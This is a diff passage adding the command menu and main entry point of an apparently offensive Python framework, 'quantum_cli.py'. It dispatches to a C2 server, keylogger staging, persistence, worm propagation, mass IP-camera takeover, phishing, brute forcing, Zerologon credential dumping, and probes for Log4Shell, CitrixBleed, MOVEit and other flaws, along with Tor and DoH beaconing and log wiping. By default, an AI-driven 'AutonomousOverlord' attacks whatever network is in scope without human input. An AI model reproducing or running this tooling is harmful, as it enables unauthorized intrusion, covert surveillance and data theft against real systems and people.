+                threading.Thread(target=FoxAcid().serve, daemon=True).start()
+                print("FOXACID on :8081 (background)")
+            elif ch == "21":
+                q = QuantumInsert(input("Target IP: "), input("Gateway IP: ")); q.poison(); q.inject()
+            elif ch == "22": print(json.dumps(SwitchboardICMP().listen(20), indent=2))
+            elif ch == "23":
+                r = AI_Supervisor().query(input("Prompt: "))
+                print(r if r else "[AI unavailable — QBrain mode active]")
+            elif ch == "24": OPSEC.ensure_tor()
+            elif ch == "25": GRAYFISH.seal_dir()
+            elif ch == "26": GRAYFISH.unseal_dir()
+            elif ch == "27":
+                model = DM.deploy_local_ai()
+                print(json.dumps({"local_ai": model, "models_dir": MODELS_DIR}))
+            elif ch == "28":
+                scope = input("Scope CIDR (blank = autodetect): ") or None
+                agg = input("Aggression balanced|aggressive|patient (default balanced): ") or "balanced"
+                AutonomousOverlord(scope=scope, aggression=agg).run()
+            elif ch == "29":
+                ip = input("Target IP: ")
+                print(json.dumps({"log4shell": v3_log4shell(ip), "citrixbleed": v3_citrixbleed(ip),
+                                  "citrix_path": v3_citrix_path(ip), "panos": v3_panos_cmd(ip),
+                                  "confluence": v3_confluence_ognl(ip), "weblogic": v3_weblogic_console(ip),
+                                  "iosxe": v3_ios_admin(ip), "vcenter": v3_vcenter_upload(ip),
+                                  "moveit": v3_moveit_probe(ip)}, indent=2, default=str))
+            elif ch == "30":
+                arm = input("Arm kill-switch (y=arm, n=disarm): ").lower().startswith("y")
+                if arm:
+                    print(json.dumps(kill_all_implants(wipe_first=True)))
+                else:
+                    KILLSWITCH["on"] = False
+                    print("kill-switch disarmed")
+            else:
+                print("unknown option")
+        except Exception as e:
+            log(f"menu error: {e}", "ERR")
+
+# ============================================================================
+# 15. MAIN
+# ============================================================================
+NEEDS_TARGET = {"osint", "recon", "validator", "auto", "phish", "brute", "router",
+                "worm", "camshot", "quantum", "cottonmouth", "zerocheck"}
+
+def _is_ipv4(s):
+    return bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", s or ""))
+
+def main():
+    p = argparse.ArgumentParser(
+        description="QUANTUM-CLI FINAL V3.1 — no args = fully autonomous (camera-first)")
+    p.add_argument("cmd", nargs="?", default=None,
+                   choices=["serve", "foxacid", "quantum", "recon", "osint", "auto",
+                            "dohc2", "icmp", "trinity", "camwar", "cams", "wifi", "triage",
+                            "mfp", "pcap", "camshot", "router", "worm", "episcribe",
+                            "cottonmouth", "validator", "tor", "seal", "unseal", "brute",
+                            "phish", "keygen", "deployai", "zerologon", "mitre", "federation",
+                            "posixagent", "zerocheck", "mshtmaldoc", "flashfill", "emoji",
+                            "macreset", "keylog", "wipe", "persist", "ghostdns", "cagebreak"],
+                   help="direct command (optional)")
+    p.add_argument("--menu", action="store_true", help="manual console")
+    p.add_argument("--scope", "-c", dest="cidr", help="autonomous/scan scope CIDR")
+    p.add_argument("--target", "-t", help="external target CIDR/IP — run camera war on it "
+                                          "AUTONOMOUSLY by default (add --manual for manual)")
+    p.add_argument("--manual", action="store_true", help="with --target: manual camera console")
+    p.add_argument("--camera-only", action="store_true",
+                   help="autonomous mode restricted to camera operations")
+    p.add_argument("--no-ai", action="store_true",
+                   help="run fully deterministic (QBrain) — no AI prompts, no model downloads")
+    p.add_argument("--cycles", type=int, default=0, help="autonomous cycle cap (0=infinite)")
+    p.add_argument("--aggression", default="balanced", choices=["balanced", "aggressive", "patient"])
+    p.add_argument("--model", help="pin local AI model (overrides adaptive selection)")
+    p.add_argument("--kill", action="store_true",
+                   help="with 'serve'less direct run: arm the kill-switch against live C2 via /kill")
+    p.add_argument("--domain", help="operator-controlled domain for DoH egress beacons (ghostdns)")
+    p.add_argument("-g", "--gateway"); p.add_argument("--iface")
+    p.add_argument("--peer", help="federation peer .onion to sync")
+    p.add_argument("-dc-ip"); p.add_argument("-dc-name"); p.add_argument("-d")
+    p.add_argument("-f", "--file"); p.add_argument("--force", action="store_true")
+    a = p.parse_args()
+
+    if a.no_ai:
+        os.environ["QCLI_NO_AI"] = "1"
+        AI_Supervisor.ai_dead = True
+
+    # ---- sanity guards for direct commands ----
+    if a.cmd in NEEDS_TARGET and not a.target:
+        print(f"error: command '{a.cmd}' needs -t/--target (IP or CIDR)"); return
+    if a.cmd == "pcap" and not a.file:
+        print("error: command 'pcap' needs -f/--file <pcap path>"); return
+
+    # ---- AI bootstrap: .env -> 5s prompt -> search/deploy local model in dir ----
+    sup = AI_Supervisor()
+    if a.model:
+        os.environ["QCLI_PINNED_MODEL"] = a.model
+    try:
+        sup.bootstrap()
+    except Exception as e:
+        log(f"AI bootstrap issue (continuing — QBrain fallback available): {e}", "WARN")
+
+    # -------- external target: autonomous camera war BY DEFAULT --------
+    if a.target:
+        if "/" in a.target:
+            cidr = a.target
+        elif _is_ipv4(a.target):
+            cidr = a.target.rsplit(".", 1)[0] + ".0/24"
+        else:
+            cidr = a.target
+        log(f"EXTERNAL target given: {cidr}", "AUTO")
+        if a.manual:
+            camera_console(cidr)
+        else:
+            AutonomousOverlord(scope=cidr, aggression=a.aggression,
+                                camera_only=a.camera_only).run()
+        return
+
+    if not a.cmd and not a.menu:
+        AutonomousOverlord(scope=a.cidr, cycles=a.cycles, aggression=a.aggression,
+                           camera_only=a.camera_only).run()
+        return
+
+    if a.menu:
+        menu(); return
+
+    if   a.cmd == "keygen":     keygen(a.force); return
+    elif a.cmd == "deployai":
+        print(json.dumps({"local_ai": DM.deploy_local_ai(a.model), "models_dir": MODELS_DIR})); return
+    elif a.cmd == "tor":        OPSEC.ensure_tor(); return
+    elif a.cmd == "seal":       GRAYFISH.seal_dir(); return
+    elif a.cmd == "unseal":     GRAYFISH.unseal_dir(); return
+    elif a.cmd == "serve":
+        keygen()
+        def _read(p, alt):
+            fp = p if os.path.isabs(p) else os.path.join(QCLI_DIR, p)
+            return open(fp).read() if os.path.isfile(fp) else alt
+        agents = {"default": _read(AGENT, "# agent file missing"),
+                  "linux":   _read("ghostfang.sh", "# run posixagent first"),
+                  "mac":     _read("ghostfang.sh", "# run posixagent first")}
+        run_c2(make_c2(agents)); return
+    elif a.cmd == "foxacid":    FoxAcid().serve(); return
+    elif a.cmd == "quantum":
+        q = QuantumInsert(a.target, a.gateway); q.poison()
+        threading.Thread(target=q.inject, daemon=True).start(); time.sleep(70); return
+    elif a.cmd == "mitre":     print(json.dumps(MitreMapper().map_audit(), indent=2)); return
+    elif a.cmd == "federation":
+        if a.peer: print(json.dumps({"merged": FEDERATION.pull(a.peer)})); return
+        print(json.dumps({"onion": FEDERATION.start_hidden_service()})); return
+    elif a.cmd == "posixagent":
+        print(json.dumps({"agent": generate_posix_agent(a.target or local_ip())})); return
+    elif a.cmd == "ghostdns":
+        domain = a.domain or load_env_file().get("QCLI_DOMAIN") or os.environ.get("QCLI_DOMAIN")
+        if not domain:
+            print("usage: quantum_cli.py ghostdns --domain yourdomain.tld "
+                  "(also honored via .env QCLI_DOMAIN)"); return
+        print(json.dumps({"agent": generate_dns_agent(domain),
+                          "task_check": doh_task_check(domain)})); return
+    elif a.cmd == "osint":     print(json.dumps(ReconModule().osint(a.target), indent=2, default=str)); return
+    elif a.cmd == "recon":     print(json.dumps(ReconModule().fingerprint(a.target), indent=2, default=str)); return
+    elif a.cmd == "validator": print(json.dumps(VALIDATOR.score(a.target, ReconModule().fingerprint(a.target)), indent=2)); return
+    elif a.cmd == "auto":      print(json.dumps(ExploitOrchestrator().auto_exploit(a.target, force=a.force), indent=2, default=str)); return
+    elif a.cmd == "zerocheck": print(json.dumps({"log4shell": v3_log4shell(a.target),
+                                                 "citrixbleed": v3_citrixbleed(a.target),
+                                                 "citrix_path": v3_citrix_path(a.target),
+                                                 "panos": v3_panos_cmd(a.target),
+                                                 "confluence": v3_confluence_ognl(a.target),
+                                                 "weblogic": v3_weblogic_console(a.target),
+                                                 "iosxe": v3_ios_admin(a.target),
+                                                 "vcenter": v3_vcenter_upload(a.target),
+                                                 "moveit": v3_moveit_probe(a.target)},
+                                                indent=2, default=str)); return
+    elif a.cmd == "mshtmaldoc": print(json.dumps(v3_mshtml_maldoc(local_ip()), default=str)); return
+    elif a.cmd == "flashfill": print(json.dumps(flashfill())); return
+    elif a.cmd == "emoji":
+        msg = input("Message: ") or "ping"
+        print(emoji_encode(msg)); print("DECODED CHECK:", emoji_decode(emoji_encode(msg))); return
+    elif a.cmd == "macreset":  print(json.dumps({"script": macos_recovery_reset()})); return
+    elif a.cmd == "keylog":    print(json.dumps({"staged": stage_keylogger()})); return
+    elif a.cmd == "wipe":
+        print(json.dumps(footprint_wipe_windows() if os.name == "nt" else footprint_wipe_posix())); return
+    elif a.cmd == "persist":   print(json.dumps(persistx())); return
+    elif a.cmd == "cagebreak": print(json.dumps(cagebreak(), indent=2, default=str)); return
+    elif a.cmd == "zerologon":
+        if not (a.dc_ip and a.dc_name):
+            print("usage: quantum_cli.py zerologon -dc-ip <ip> -dc-name <name> -d <domain>"); return
+        print(json.dumps({"dumped": zerologon_dump(a.dc_ip, a.dc_name, a.domain or "corp.local")})); return
+    elif a.cmd == "dohc2":     HTTPServer(("0.0.0.0", 5353), DoHC2BeaconServer).serve_forever(); return
+    elif a.cmd == "icmp":      print(json.dumps(SwitchboardICMP().listen(20), indent=2)); return
+    elif a.cmd == "trinity":   Trinity().capture(); return
+    elif a.cmd == "wifi":      print(json.dumps(Somberknight().sweep(), indent=2)); return
+    elif a.cmd == "triage":    print(json.dumps(Wildfire().triage(), indent=2, default=str)); return
+    elif a.cmd == "mfp":       print(json.dumps({"persisted": MFP().persist()})); return
+    elif a.cmd == "pcap":      print(json.dumps(DataHarvester().analyze_pcap(a.file), indent=2)); return
+    elif a.cmd == "camwar":
+        print(json.dumps(CAMWAR.pwn_network(a.cidr or a.target or local_scope()), indent=2)); return
+    elif a.cmd == "cams":
+        cams = CAMWAR.discover(a.cidr or a.target or local_scope())
+        for cam in cams:
+            if CAMWAR.attack_cam(cam): CAMWAR.control_cam(cam)
+        return
+    elif a.cmd == "camshot":
+        print(json.dumps(CAMWAR.one_shot(a.target), indent=2, default=str)); return
+    elif a.cmd == "router":    print(json.dumps(UnitedDrake().attack_router(a.target) or {}, indent=2)); return
+    elif a.cmd == "worm":
+        t = threading.Thread(target=GODSUPREME.hop_from, args=(a.target,), daemon=True)
+        t.start(); t.join(); return
+    elif a.cmd == "episcribe":
+        e = EpiScribe()
+        if a.target: e.add_selector(a.target)
+        e.watch(duration=300); print(json.dumps(e.events, indent=2)); return
+    elif a.cmd == "cottonmouth":
+        print(json.dumps({"staged": CottonMouth().stage_payload(a.target or local_ip())})); return
+    elif a.cmd == "brute":     print(json.dumps(BruteEngineV3().run({"ip": a.target}), indent=2)); return
+    elif a.cmd == "phish":     print(json.dumps(PhishEngine().launch({"target_email": a.target}), indent=2, default=str)); return
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        log("operator interrupt — sealing loot and exiting", "AUTO"); GRAYFISH.seal_dir()
+    except SystemExit:
+        raise
+    except Exception as _fatal:
+        log(f"FATAL: {_fatal}", "ERR")
+        import traceback
+        os.makedirs(LOG_DIR, exist_ok=True)
+        with open(os.path.join(LOG_DIR, "crash.log"), "a") as f:
+            f.write(f"--- {datetime.now().isoformat()} ---\n" + traceback.format_exc() + "\n")
+        sys.exit(1)
